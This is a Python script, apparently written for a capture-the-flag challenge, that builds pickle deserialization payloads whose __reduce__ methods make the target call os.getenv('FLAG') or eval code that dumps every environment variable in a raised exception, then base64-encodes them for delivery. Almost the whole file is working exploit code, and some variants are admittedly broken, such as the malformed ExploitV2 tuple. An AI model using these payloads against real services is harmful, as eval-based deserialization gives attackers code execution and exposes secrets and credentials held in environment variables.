import pickle
import base64
import os

print("="*60)
print("CREATING ROBUST PICKLE EXPLOIT")
print("="*60)

# The issue is that the class needs to exist at deserialization time.
# Better approach: Use functions that are available in __builtins__ or import them

# Option 1: Use __builtins__ directly
# Option 2: Use __import__ to import os dynamically
# Option 3: Nested reduce to import and then use

# Best approach for this task: Use os.getenv directly (already imported above)
# This creates a payload that calls os.getenv('FLAG') when deserialized

class GetFlag:
    def __reduce__(self):
        # Return (callable, args) tuple
        # pickle will execute: os.getenv('FLAG')
        return (os.getenv, ('FLAG', 'FLAG_NOT_SET'))

get_flag = GetFlag()
flag_payload = pickle.dumps(get_flag, protocol=4)
flag_payload_b64 = base64.b64encode(flag_payload).decode()

print(f"\nPayload 1 - Get FLAG env var:")
print(f"Base64 payload: {flag_payload_b64}")
print(f"Payload length: {len(flag_payload_b64)}")

# Test
print("\nTest 1 (get FLAG):")
try:
    result = pickle.loads(base64.b64decode(flag_payload_b64))
    print(f"Result: {result}")
except Exception as e:
    print(f"Exception: {type(e).__name__}: {e}")

# Option 2: Raise exception with all env vars using a lambda wrapper
# We need a function that exists that we can use
# __builtins__.exec can execute code

class GetAllEnv:
    def __reduce__(self):
        # Use __import__('os').environ to get all env vars
        # Then format and raise
        import os as local_os
        def raise_with_env():
            env_str = '\n'.join(f'{k}={v}' for k, v in local_os.environ.items())
            raise Exception(f'ENV:\n{env_str}')
        return (raise_with_env, ())

# This won't work because the function isn't pickleable across different environments

# Better: Use __reduce__ with __import__ and getattr chains
class RaiseEnvException:
    def __reduce__(self):
        # Import os, get environ dict, convert to string, raise exception
        # Using nested lambda or function references
        return (eval, ("raise Exception(str(__import__('os').environ))",))

raise_env = RaiseEnvException()
try:
    raise_payload = pickle.dumps(raise_env, protocol=4)
    print(f"\nEval-based payload: {base64.b64encode(raise_payload).decode()}")
except Exception as e:
    print(f"Eval approach failed: {e}")

# Option 3: Use __builtins__ properly with nested calls
print("\n" + "="*60)
print("WORKING SOLUTION - Using nested __import__:")
print("="*60)

# Create a payload that imports os and returns environ
# Using __reduce__ with a tuple of operations

class ExploitV2:
    def __reduce__(self):
        # This will: getattr(__import__('os'), 'getenv')('FLAG')
        return (
            getattr,
            (__import__('os'), 'getenv'),
            'FLAG',
            'DEFAULT_FLAG_VALUE'
        )
        # Actually this is wrong - getattr takes 2 or 3 args, not callable with args

# Correct approach for v2
class ExploitV3:
    def __reduce__(self):
        # Call: __import__('os').getenv('FLAG', 'NOT_FOUND')
        # To do this in reduce, we need nested calls
        # (getattr(__import__('os'), 'getenv'), ('FLAG', 'NOT_FOUND'))
        return (
            getattr(__import__('os'), 'getenv'),
            ('FLAG', 'NOT_FOUND')
        )

exploit_v3 = ExploitV3()
